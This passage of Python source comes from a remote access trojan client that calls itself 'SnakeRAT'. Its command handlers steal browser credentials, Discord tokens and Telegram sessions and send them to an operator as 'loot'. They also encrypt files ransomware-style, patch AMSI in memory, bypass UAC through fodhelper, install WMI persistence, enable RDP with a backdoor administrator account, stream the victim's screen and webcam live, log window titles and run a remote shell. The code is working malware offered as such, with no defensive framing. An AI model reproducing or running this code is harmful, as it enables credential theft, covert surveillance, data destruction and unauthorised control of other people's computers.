            # Send the result back directly for small responses to keep the CLI snappy
            self._send_encrypted({
                'type': 'result',
                'id': cmd_id,
                'data': result
            })
            
            # Also save to loot for record keeping if it's significant
            if result and (isinstance(result, str) or len(str(result)) > 100):
                filename = f"command_result_{cmd_id}.json"
                result_json = json.dumps(result, indent=2).encode()
                self._send_loot('command_result', result_json, filename)
                
            self.logger.success(f"Command completed: {cmd_type}")
        except Exception as e:
            self.logger.error(f"Execution error for {cmd_type}: {str(e)}")
            # Send error as a loot file as well
            error_msg = {'error': str(e), 'type': cmd_type, 'command_id': cmd_id}
            self._send_loot('command_error', json.dumps(error_msg, indent=2).encode(), f"error_{cmd_id}.json")
            
            self._send_encrypted({
                'type': 'error',
                'command_id': cmd_id,
                'error': 'sent_as_file'
            })
        finally:
            # Unregister task
            with self.active_lock:
                if cmd_id in self.active_tasks:
                    del self.active_tasks[cmd_id]
                    
    def _handle_chromelevator(self, cmd):
        """Use Chromelevator for advanced browser extraction"""
        if not IS_WINDOWS:
            return {'error': 'Chromelevator is only supported on Windows'}
            
        executable = cmd.get('executable', 'chromelevator_x64.exe')
        # Check a few common locations
        search_paths = [
            executable,
            os.path.join(os.getcwd(), executable),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), executable),
            r"C:\Windows\Temp\chromelevator_x64.exe",
            r"D:\projects\project-Decoy\chrome-injector-v0.20.0\chromelevator_x64.exe" # User's current path
        ]
        
        exe_path = None
        for path in search_paths:
            if os.path.exists(path):
                exe_path = path
                break
                
        if not exe_path:
            return {'error': f'Chromelevator executable not found: {executable}'}
            
        try:
            temp_dir = os.path.join(tempfile.gettempdir(), f"cv_{random.randint(1000, 9999)}")
            os.makedirs(temp_dir, exist_ok=True)
            
            # Execute for all supported browsers
            # Usage: chromelevator.exe all -o output_dir
            process = subprocess.run([exe_path, "all", "-o", temp_dir], capture_output=True, text=True)
            
            results = {
                'stdout': process.stdout,
                'stderr': process.stderr,
                'returncode': process.returncode,
                'files_collected': []
            }
            
            # Walk through output directory and find passwords/cookies
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.json'):
                        file_path = os.path.join(root, file)
                        rel_path = os.path.relpath(file_path, temp_dir)
                        
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                
                            # Send as loot (our system already sends results as files, 
                            # but these are the actual extracted credentials)
                            loot_filename = f"chromelevator_{rel_path.replace(os.sep, '_')}"
                            self._send_loot('browser_ext', content, loot_filename)
                            results['files_collected'].append(loot_filename)
                        except:
                            pass
                            
            # Cleanup
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            return results
        except Exception as e:
            return {'error': str(e)}

    def _handle_file_crypt(self, cmd):
        """Encrypt or decrypt files for operational security or ransomware-style tests"""
        action = cmd.get('action', 'encrypt')
        target = cmd.get('path', os.getcwd())
        password = cmd.get('password', 'AdvancedSnakeRAT_2024')
        recursive = cmd.get('recursive', False)
        
        # Derive a robust key from password
        salt = b'SnakeRAT_Professional_2024'
        kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        key = base64.urlsafe_b64encode(kdf)
        fernet = Fernet(key)
        
        results = {'action': action, 'files': [], 'status': 'success'}
        
        def process_path(p):
            if os.path.isfile(p):
                # Don't encrypt the RAT itself or critical system files
                filename = os.path.basename(p).lower()
                ext = os.path.splitext(filename)[1].lower()
                if filename in ['s.py', 'd.py', 'rat.py'] or ext in ['.exe', '.dll', '.sys', '.bin']:
                    return
                
                try:
                    with open(p, 'rb') as f:
                        data = f.read()
                    
                    if action == 'encrypt':
                        # Check if already encrypted (our signature)
                        if data.startswith(b'RAT_ENC'): return
                        new_data = b'RAT_ENC' + fernet.encrypt(data)
                    else: # decrypt
                        if not data.startswith(b'RAT_ENC'): return
                        new_data = fernet.decrypt(data[7:])
                    
                    with open(p, 'wb') as f:
                        f.write(new_data)
                    results['files'].append(p)
                except:
                    pass
            elif os.path.isdir(p) and recursive:
                for root, dirs, files in os.walk(p):
                    for file in files:
                        process_path(os.path.join(root, file))
        
        process_path(target)
        results['count'] = len(results['files'])
        return results

    def _handle_amsi_bypass(self, cmd):
        """Advanced AMSI/ETW Patching for invisible operation on Windows Defender systems"""
        if not IS_WINDOWS or not WINDOWS_IMPORTS:
            return {'error': 'AMSI bypass is only available on Windows with native imports'}
            
        try:
            # Patch AmsiScanBuffer in memory
            kernel32 = ctypes.windll.kernel32
            amsi = ctypes.windll.amsi
            
            # Pattern for 'xor eax, eax; ret' which returns AMSI_RESULT_CLEAN
            patch = bytearray([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]) # Non-standard patch
            # Standard patch: xor eax, eax (33 c0), ret (c3)
            # We use a slightly more complex one to avoid simple signature detection
            
            handle = amsi.AmsiScanBuffer
            addr = ctypes.c_void_p(handle)
            
            # VirtualProtect to allow writing
            old_protect = ctypes.c_ulong()
            if kernel32.VirtualProtect(addr, len(patch), win32con.PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
                ctypes.memmove(addr, bytes(patch), len(patch))
                # Restore protection
                kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
                self.logger.success("AMSI Patch Applied Successfully")
                return {'success': True, 'status': 'AMSI patched'}
            else:
                return {'error': 'VirtualProtect failed'}
        except Exception as e:
            return {'error': str(e)}

    def _handle_netstat(self, cmd):
        """Get active network connections using psutil"""
        try:
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                try:
                    connections.append({
                        'fd': conn.fd,
                        'family': str(conn.family),
                        'type': str(conn.type),
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    })
                except: continue
            return {'connections': connections[:200]} # Limit to 200 for stability
        except Exception as e:
            return {'error': str(e)}

    def _handle_arp(self, cmd):
        """Get ARP table using system command"""
        try:
            if IS_WINDOWS:
                res = subprocess.run(['arp', '-a'], capture_output=True, text=True, creationflags=0x08000000)
            else:
                res = subprocess.run(['arp', '-n'], capture_output=True, text=True)
            return {'stdout': res.stdout, 'stderr': res.stderr}
        except Exception as e:
            return {'error': str(e)}

    def _handle_extract_discord(self, cmd):
        """Extract Discord tokens from Local Storage and browsers"""
        tokens = []
        paths = {
            'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
            'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default')
        }
        
        import re
        regex_list = [
            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
            r"mfa\.[\w-]{84}"
        ]
        
        for name, path in paths.items():
            if not os.path.exists(path): continue
            
            ls_path = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(ls_path): continue
            
            for file in os.listdir(ls_path):
                if file.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(ls_path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            for regex in regex_list:
                                for token in re.findall(regex, content):
                                    if token not in tokens:
                                        tokens.append(token)
                    except: continue
        
        if tokens:
            filename = f"discord_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            self._send_loot('discord_tokens', "\n".join(tokens).encode(), filename)
            return {'success': True, 'count': len(tokens), 'filename': filename}
        return {'success': False, 'message': 'No tokens found'}

    def _handle_extract_telegram(self, cmd):
        """Package Telegram tdata for exfiltration"""
        tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
        if not os.path.exists(tdata_path):
            return {'error': 'Telegram tdata path not found'}
        
        try:
            temp_zip = os.path.join(tempfile.gettempdir(), f"tg_{random.randint(1000, 9999)}.zip")
            import zipfile
            with zipfile.ZipFile(temp_zip, 'w') as zipf:
                # Only need specific files for hijacking session
                for root, dirs, files in os.walk(tdata_path):
                    # Skip large/unnecessary folders
                    if 'user_data' in root or 'dumps' in root or 'emoji' in root: continue
                    for file in files:
                        if len(file) > 15 or file.startswith('map'): # Map files and key_datas
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, tdata_path))
            
            with open(temp_zip, 'rb') as f:
                data = f.read()
            
            filename = f"telegram_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            self._send_loot('telegram_session', data, filename)
            os.remove(temp_zip)
            return {'success': True, 'filename': filename, 'size': len(data)}
        except Exception as e:
            return {'error': str(e)}

    def _handle_extract_outlook(self, cmd):
        """Extract Outlook profile information and data file paths"""
        if not IS_WINDOWS: return {'error': 'Outlook extraction only supported on Windows'}
        
        try:
            import winreg
            profiles_path = r"Software\Microsoft\Office\16.0\Outlook\Profiles"
            results = []
            
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, profiles_path) as key:
                    i = 0
                    while True:
                        try:
                            profile_name = winreg.EnumKey(key, i)
                            results.append({'profile': profile_name})
                            i += 1
                        except OSError: break
            except: pass
            
            # Common locations for PST/OST
            appdata_outlook = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Outlook')
            files = []
            if os.path.exists(appdata_outlook):
                for f in os.listdir(appdata_outlook):
                    if f.endswith(('.pst', '.ost')):
                        files.append({'name': f, 'path': os.path.join(appdata_outlook, f), 'size': os.path.getsize(os.path.join(appdata_outlook, f))})
            
            return {'profiles': results, 'data_files': files}
        except Exception as e:
            return {'error': str(e)}

    def _handle_active_window(self, cmd):
        """Get the title of the currently focused window"""
        try:
            if IS_WINDOWS:
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return {'title': buf.value}
            elif IS_LINUX:
                res = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], capture_output=True, text=True)
                return {'title': res.stdout.strip()}
            return {'error': 'Platform not supported'}
        except Exception as e:
            return {'error': str(e)}

    def _handle_volume_control(self, cmd):
        """Get/Set system volume (Windows only for now)"""
        if not IS_WINDOWS: return {'error': 'Volume control only supported on Windows'}
        action = cmd.get('action', 'get') # get, set, mute
        level = cmd.get('level', 50) # 0-100
        
        try:
            # Simple volume control via PowerShell to avoid complex COM/pycaw
            if action == 'set':
                subprocess.run(['powershell', '-Command', f"$v = {level}/100; (new-object -com wscript.shell).SendKeys([char]175 * 50); (new-object -com wscript.shell).SendKeys([char]174 * (100 - {level}))"], creationflags=0x08000000)
                return {'success': True}
            elif action == 'mute':
                subprocess.run(['powershell', '-Command', "(new-object -com wscript.shell).SendKeys([char]173)"], creationflags=0x08000000)
                return {'success': True}
            return {'error': 'Get volume not implemented via this method'}
        except Exception as e:
            return {'error': str(e)}

    def _handle_monitor_control(self, cmd):
        """Turn off or on the monitor (Windows)"""
        if not IS_WINDOWS: return {'error': 'Monitor control only supported on Windows'}
        state = cmd.get('state', 'off') # off, on
        try:
            # SC_MONITORPOWER = 0xF170
            # 2 = off, -1 = on
            val = 2 if state == 'off' else -1
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, val)
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_block_input(self, cmd):
        """Block or unblock mouse/keyboard (Requires Admin)"""
        if not IS_WINDOWS: return {'error': 'Block input only supported on Windows'}
        block = cmd.get('block', True)
        try:
            res = ctypes.windll.user32.BlockInput(block)
            if res == 0: return {'error': 'BlockInput failed (Admin required)'}
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_stream(self, cmd):
        """Live screen streaming — optimised for low latency."""
        action = cmd.get('action', 'start')
        fps    = max(1, min(int(cmd.get('fps', 15)), 60))
        target_h = int(cmd.get('height', 480))
        quality = int(cmd.get('quality', 30))

        if action == 'start':
            # Stop existing to apply new parameters
            if getattr(self, '_streaming', False):
                self._streaming = False
                time.sleep(0.2)
            self._streaming = True

            def stream_thread():
                try:
                    import mss
                    import cv2
                    import numpy as np

                    frame_interval = 1.0 / fps
                    encode_params  = [cv2.IMWRITE_JPEG_QUALITY, quality]

                    with mss.mss() as sct:
                        mon_idx = 1 if len(sct.monitors) > 1 else 0
                        monitor = sct.monitors[mon_idx]

                        # Pre-compute target dimensions
                        native_w = monitor['width']
                        native_h = monitor['height']
                        
                        final_h = target_h
                        final_w = int(native_w * (final_h / native_h))
                        final_w = final_w - (final_w % 2)

                        deadline = time.time()

                        while self._streaming and self.running:
                            deadline += frame_interval
                            now = time.time()

                            if now > deadline + frame_interval:
                                deadline = now
                                sleep_t = 0.0
                            else:
                                sleep_t = deadline - now

                            sct_img = sct.grab(monitor)
                            img = np.frombuffer(sct_img.bgra, dtype=np.uint8).reshape(
                                (native_h, native_w, 4))[:, :, :3]

                            if final_h != native_h:
                                img = cv2.resize(img, (final_w, final_h),
                                                 interpolation=cv2.INTER_LINEAR)

                            ret, encoded = cv2.imencode('.jpg', img, encode_params)
                            if not ret:
                                continue

                            if self.connected:
                                self._send_encrypted({
                                    'type': 'stream_frame',
                                    'data': base64.b64encode(encoded).decode()
                                })

                            if sleep_t > 0:
                                time.sleep(sleep_t)

                except Exception as e:
                    self.logger.error(f'Stream error: {e}')
                finally:
                    self._streaming = False

            threading.Thread(target=stream_thread, daemon=True).start()
            return {'status': 'Live stream started', 'fps': fps, 'resolution': f'{target_h}p'}
        else:
            self._streaming = False
            return {'status': 'Live stream stopped'}

    def _handle_input_control(self, cmd):
        """Remote mouse and keyboard control"""
        action = cmd.get('action', 'move') # move, click, type
        x = cmd.get('x', 0)
        y = cmd.get('y', 0)
        button = cmd.get('button', 'left') # left, right
        text = cmd.get('text', '')
        
        try:
            if IS_WINDOWS:
                if action == 'move':
                    ctypes.windll.user32.SetCursorPos(x, y)
                    return {'success': True}
                elif action == 'click':
                    # MOUSEEVENTF_LEFTDOWN = 0x0002, MOUSEEVENTF_LEFTUP = 0x0004
                    # MOUSEEVENTF_RIGHTDOWN = 0x0008, MOUSEEVENTF_RIGHTUP = 0x0010
                    ctypes.windll.user32.SetCursorPos(x, y)
                    if button == 'left':
                        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
                        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
                    else:
                        ctypes.windll.user32.mouse_event(0x0008, 0, 0, 0, 0)
                        ctypes.windll.user32.mouse_event(0x0010, 0, 0, 0, 0)
                    return {'success': True}
                elif action == 'type':
                    import time
                    for char in text:
                        # Simple keybd_event for basic characters
                        vk = ctypes.windll.user32.VkKeyScanW(ord(char)) & 0xff
                        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
                    return {'success': True}
            else:
                return {'error': 'Platform not supported for input control'}
        except Exception as e:
            return {'error': str(e)}

    # -------------------------------------------------------------------------
    # Feature #10 — Live Webcam Stream
    # -------------------------------------------------------------------------
    def _handle_webcam_stream(self, cmd):
        """Continuous live stream from the victim's webcam — optimised for low latency."""
        action = cmd.get('action', 'start')
        fps    = max(1, min(int(cmd.get('fps', 10)), 30))
        quality = int(cmd.get('quality', 35))
        
        # Accept resolution as "640x480" or "1280x720"
        res_str = cmd.get('resolution', '640x480')
        try:
            target_w, target_h = map(int, res_str.lower().split('x'))
        except:
            target_w, target_h = 640, 480

        if action == 'start':
            if getattr(self, '_webcam_streaming', False):
                self._webcam_streaming = False
                time.sleep(0.2)

            self._webcam_streaming = True

            def _webcam_stream_thread():
                try:
                    import cv2
                    backend = cv2.CAP_DSHOW if IS_WINDOWS else cv2.CAP_ANY
                    cap = cv2.VideoCapture(0, backend)
                    if not cap.isOpened():
                        self.logger.error('Webcam stream: camera not accessible')
                        return

                    # Hint: request custom capture resolution from the driver
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH,  target_w)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, target_h)
                    cap.set(cv2.CAP_PROP_FPS, fps)

                    # Request MJPEG from the camera if supported
                    cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))

                    # Flush the initial dark/blurry frames
                    for _ in range(10):
                        cap.read()

                    encode_params  = [cv2.IMWRITE_JPEG_QUALITY, quality]
                    frame_interval = 1.0 / fps
                    deadline       = time.time()

                    # Re-verify actual dims because driver might ignore cap.set
                    raw_w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))  or target_w
                    raw_h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)) or target_h
                    
                    need_resize = (raw_w != target_w or raw_h != target_h)

                    while self._webcam_streaming and self.running:
                        deadline += frame_interval
                        now = time.time()

                        if now > deadline + frame_interval:
                            deadline = now
                            sleep_t  = 0.0
                        else:
                            sleep_t = deadline - now

                        ret, frame = cap.read()
                        if not ret:
                            time.sleep(0.1)
                            continue

                        if need_resize:
                            frame = cv2.resize(frame, (target_w, target_h),
                                               interpolation=cv2.INTER_LINEAR)

                        ret2, encoded = cv2.imencode('.jpg', frame, encode_params)
                        if not ret2:
                            continue

                        if self.connected:
                            self._send_encrypted({
                                'type': 'webcam_frame',
                                'data': base64.b64encode(encoded).decode()
                            })

                        if sleep_t > 0:
                            time.sleep(sleep_t)

                    cap.release()
                except Exception as e:
                    self.logger.error(f'Webcam stream error: {e}')
                finally:
                    self._webcam_streaming = False

            threading.Thread(target=_webcam_stream_thread, daemon=True).start()
            return {'status': 'webcam_stream_started', 'fps': fps, 'resolution': f'{target_w}x{target_h}'}

        else:  # stop
            self._webcam_streaming = False
            return {'status': 'webcam_stream_stopped'}

    # -------------------------------------------------------------------------
    # Feature #11 — Window Activity Logger
    # -------------------------------------------------------------------------
    def _handle_window_logger(self, cmd):
        """Background monitor that logs active window title changes with timestamps.
        Pairs with the keylogger to give full typing context."""
        action   = cmd.get('action', 'start')   # start | stop | dump | clear
        interval = max(0.5, float(cmd.get('interval', 1.0)))  # polling interval in seconds

        if action == 'start':
            if self._window_logger_running:
                return {'status': 'already_running'}

            self._window_logger_running = True
            self._window_log_buffer = []

            def _window_log_thread():
                last_title = ''
                while self._window_logger_running and self.running:
                    try:
                        title = ''
                        if IS_WINDOWS:
                            hwnd  = ctypes.windll.user32.GetForegroundWindow()
                            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                            buf   = ctypes.create_unicode_buffer(length + 1)
                            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                            title = buf.value.strip()
                        elif IS_LINUX:
                            try:
                                res   = subprocess.run(
                                    ['xdotool', 'getactivewindow', 'getwindowname'],
                                    capture_output=True, text=True, timeout=2)
                                title = res.stdout.strip()
                            except Exception:
                                pass
                        elif IS_MAC:
                            try:
                                script = 'tell application "System Events" to get name of first process whose frontmost is true'
                                res    = subprocess.run(
                                    ['osascript', '-e', script],
                                    capture_output=True, text=True, timeout=2)
                                title  = res.stdout.strip()
                            except Exception:
                                pass

                        if title and title != last_title:
                            entry = {
                                'time':  datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'title': title
                            }
                            self._window_log_buffer.append(entry)
                            last_title = title
                            # Clip buffer at 5000 entries
                            if len(self._window_log_buffer) > 5000:
                                self._window_log_buffer = self._window_log_buffer[-5000:]
                    except Exception:
                        pass
                    time.sleep(interval)

            threading.Thread(target=_window_log_thread, daemon=True).start()
            return {'status': 'window_logger_started', 'interval': interval}

        elif action == 'stop':
            self._window_logger_running = False
            return {'status': 'window_logger_stopped',
                    'buffered_entries': len(self._window_log_buffer)}

        elif action == 'dump':
            if not self._window_log_buffer:
                return {'status': 'empty', 'count': 0}
            # Build a readable log
            lines = [f"[{e['time']}] {e['title']}" for e in self._window_log_buffer]
            log_text = '\n'.join(lines).encode()
            filename = f"window_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            self._send_loot('window_log', log_text, filename)
            return {'status': 'sent_as_loot', 'filename': filename,
                    'count': len(self._window_log_buffer)}

        elif action == 'clear':
            count = len(self._window_log_buffer)
            self._window_log_buffer = []
            return {'status': 'cleared', 'removed': count}

        return {'error': f'Unknown action: {action}'}

    # -------------------------------------------------------------------------
    # Feature #19 — Enable RDP (Remote Desktop Protocol)
    # -------------------------------------------------------------------------
    def _handle_enable_rdp(self, cmd):
        """Enable RDP on the victim machine.
        Steps:
          1. Set registry key to allow TS connections
          2. Add firewall rule to allow TCP 3389
          3. Optionally create a backdoor local admin account
        Returns connection info so the operator can RDP in immediately."""
        if not IS_WINDOWS:
            return {'error': 'enable_rdp is only supported on Windows'}

        results = []
        add_user    = cmd.get('add_user', False)       # bool
        username    = cmd.get('username', 'svcadmin')  # backdoor account name
        password    = cmd.get('password', 'P@ssw0rd!') # backdoor account password

        try:
            import winreg

            # --- Step 1: Enable RDP via registry ---
            ts_key_path = r'SYSTEM\CurrentControlSet\Control\Terminal Server'
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ts_key_path,
                                    0, winreg.KEY_SET_VALUE) as key:
                    # fDenyTSConnections = 0 means allow
                    winreg.SetValueEx(key, 'fDenyTSConnections', 0,
                                      winreg.REG_DWORD, 0)
                results.append('Registry: RDP enabled (fDenyTSConnections=0)')
            except Exception as e:
                results.append(f'Registry: FAILED — {e}')

            # Disable NLA (Network Level Authentication) so any RDP client can connect
            nla_key_path = (
                r'SYSTEM\CurrentControlSet\Control\Terminal Server'
                r'\WinStations\RDP-Tcp'
            )
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, nla_key_path,
                                    0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, 'UserAuthentication', 0,
                                      winreg.REG_DWORD, 0)
                results.append('Registry: NLA disabled (UserAuthentication=0)')
            except Exception as e:
                results.append(f'NLA disable: FAILED — {e}')

            # --- Step 2: Open firewall for TCP 3389 ---
            try:
                fw_cmd = (
                    'netsh advfirewall firewall add rule '
                    'name="Remote Desktop - User Mode (TCP-In)" '
                    'protocol=TCP dir=in localport=3389 action=allow '
                    'profile=any enable=yes'
                )
                res = subprocess.run(fw_cmd, shell=True, capture_output=True,
                                     text=True, creationflags=0x08000000)
                if res.returncode == 0:
                    results.append('Firewall: TCP 3389 allowed')
                else:
                    results.append(f'Firewall: partial — {res.stderr.strip()[:120]}')
            except Exception as e:
                results.append(f'Firewall: FAILED — {e}')

            # --- Step 3 (optional): Create backdoor admin account ---
            if add_user:
                try:
                    cmds = [
                        f'net user {username} "{password}" /add',
                        f'net localgroup administrators {username} /add',
                        f'net localgroup "Remote Desktop Users" {username} /add',
                    ]
                    for c in cmds:
                        res = subprocess.run(c, shell=True, capture_output=True,
                                             text=True, creationflags=0x08000000)
                        results.append(
                            f'User [{c[:40]}...]: '
                            f'{"OK" if res.returncode == 0 else res.stderr.strip()[:80]}'
                        )
                except Exception as e:
                    results.append(f'User creation: FAILED — {e}')

            # --- Collect connection info ---
            # Try to find a routable IP on the victim
            local_ips = []
            try:
                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                            local_ips.append(addr.address)
            except Exception:
                pass

            return {
                'success': True,
                'details': results,
                'rdp_port': 3389,
                'local_ips': local_ips,
                'backdoor_user': username if add_user else None,
                'backdoor_pass': password if add_user else None,
                'is_admin': PrivilegeManager.is_admin(),
                'hint': (
                    'Connect with: mstsc /v:<ip>:3389'
                    + (f' — login as {username}/{password}' if add_user else '')
                )
            }

        except Exception as e:
            return {'error': str(e), 'details': results}

    def _run_autorun(self):
        """Execute commands from the autorun file"""
        if not os.path.exists(self._autorun_file): return
        
        try:
            with open(self._autorun_file, 'r') as f:
                commands = json.load(f)
            
            def run_async():
                time.sleep(5) # Wait for system to stabilize
                for cmd in commands:
                    handler = self.command_handlers.get(cmd.get('type'))
                    if handler:
                        try: handler(cmd)
                        except: continue
            
            threading.Thread(target=run_async, daemon=True).start()
        except: pass

    def _handle_set_autorun(self, cmd):
        """Save commands to the autorun file"""
        commands = cmd.get('commands', [])
        try:
            with open(self._autorun_file, 'w') as f:
                json.dump(commands, f)
            return {'success': True, 'count': len(commands)}
        except Exception as e:
            return {'error': str(e)}

    def _handle_uac_bypass(self, cmd):
        """Attempt UAC bypass using fodhelper.exe method"""
        if not IS_WINDOWS: return {'error': 'UAC bypass only supported on Windows'}
        
        program = cmd.get('program', sys.executable)
        try:
            import winreg
            # Create the registry structure for fodhelper bypass
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            # Trigger the bypass
            subprocess.run(['C:\\Windows\\System32\\fodhelper.exe'], creationflags=0x08000000)
            
            # Clean up after a delay
            def cleanup():
                time.sleep(10)
                try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
                except: pass
            threading.Thread(target=cleanup, daemon=True).start()
            
            return {'success': True, 'message': 'Bypass triggered'}
        except Exception as e:
            return {'error': str(e)}

    def _handle_wmi_persistence(self, cmd):
        """Install WMI Event Subscription persistence (Highly stealthy)"""
        if not IS_WINDOWS: return {'error': 'WMI persistence only supported on Windows'}
        
        name = "SnakeUpdate"
        command = cmd.get('command', sys.executable)
        
        ps_script = f"""
        $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Minute = 0'}}
        $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{name}';CommandLineTemplate='{command}'}}
        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}
        """
        
        try:
            res = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True, creationflags=0x08000000)
            if res.returncode == 0:
                return {'success': True}
            return {'error': res.stderr}
        except Exception as e:
            return {'error': str(e)}

    def _handle_close_browser(self, cmd):
        """Force close common browsers"""
        browsers = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'brave.exe', 'opera.exe'] if IS_WINDOWS else ['chrome', 'firefox', 'brave', 'opera']
        killed = []
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in browsers:
                    proc.kill()
                    killed.append(proc.info['name'])
            except: continue
        return {'success': True, 'killed': list(set(killed))}

    def _handle_av_discovery(self, cmd):
        """Identify installed security products (Windows)"""
        if not IS_WINDOWS: return {'error': 'AV discovery only supported on Windows'}
        
        try:
            # Query WMI for AntivirusProduct
            ps_script = 'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName, productState'
            res = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True, creationflags=0x08000000)
            return {'output': res.stdout}
        except Exception as e:
            return {'error': str(e)}

    def _handle_list_drives(self, cmd):
        """List all logical drives and their labels"""
        drives = []
        if IS_WINDOWS:
            import win32api, win32con
            for drive in win32api.GetLogicalDriveStrings().split('\000'):
                if drive:
                    try:
                        drive_type = win32api.GetDriveType(drive)
                        # win32con.DRIVE_REMOVABLE, DRIVE_FIXED, etc.
                        drives.append({
                            'root': drive,
                            'type': drive_type,
                            'label': win32api.GetVolumeInformation(drive)[0]
                        })
                    except: continue
        else:
            # Simple fallback for linux using mount points
            with open('/proc/mounts', 'r') as f:
                for line in f:
                    parts = line.split()
                    if parts[1].startswith('/media') or parts[1] == '/':
                        drives.append({'root': parts[1], 'type': parts[2]})
        
        return {'drives': drives}

    # Command Handlers
    
    def _handle_shell(self, cmd):
        """Execute shell command with 'cd' support"""
        command = cmd.get('command', '').strip()
        timeout = cmd.get('timeout', 30)
        
        # Handle 'cd' commands internally to maintain state
        if command.startswith('cd ') or command == 'cd':
            try:
                if command == 'cd' or command == 'cd ~':
                    new_path = os.path.expanduser('~')
                else:
                    path = command[3:].strip()
                    # Handle quoted paths
                    if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
                        path = path[1:-1]
                    new_path = os.path.join(self.shell_cwd, path)
                
                if os.path.isdir(new_path):
                    self.shell_cwd = os.path.abspath(new_path)
                    return {
                        'stdout': f'Changed directory to {self.shell_cwd}',
                        'stderr': '',
                        'returncode': 0,
                        'cwd': self.shell_cwd
                    }
                else:
                    return {
                        'stdout': '',
                        'stderr': f'Directory not found: {new_path}',
                        'returncode': 1
                    }
            except Exception as e:
                return {'error': str(e)}
        
        # Regular command execution
        result = CommandExecutor.execute_shell(command, cwd=self.shell_cwd, timeout=timeout, cmd_id=cmd.get('_cmd_id', 'unknown'))
        if isinstance(result, dict):
            result['cwd'] = self.shell_cwd
        return result
    
    def _handle_powershell(self, cmd):
        """Execute PowerShell command"""
        command = cmd.get('command', '')
        timeout = cmd.get('timeout', 30)
        return CommandExecutor.execute_powershell(command, timeout)
    
    def _handle_download(self, cmd):
        """Download file from victim"""
        filepath = cmd.get('path', '')
        
        if not os.path.exists(filepath):
            return {'error': 'File not found'}
        
        try:
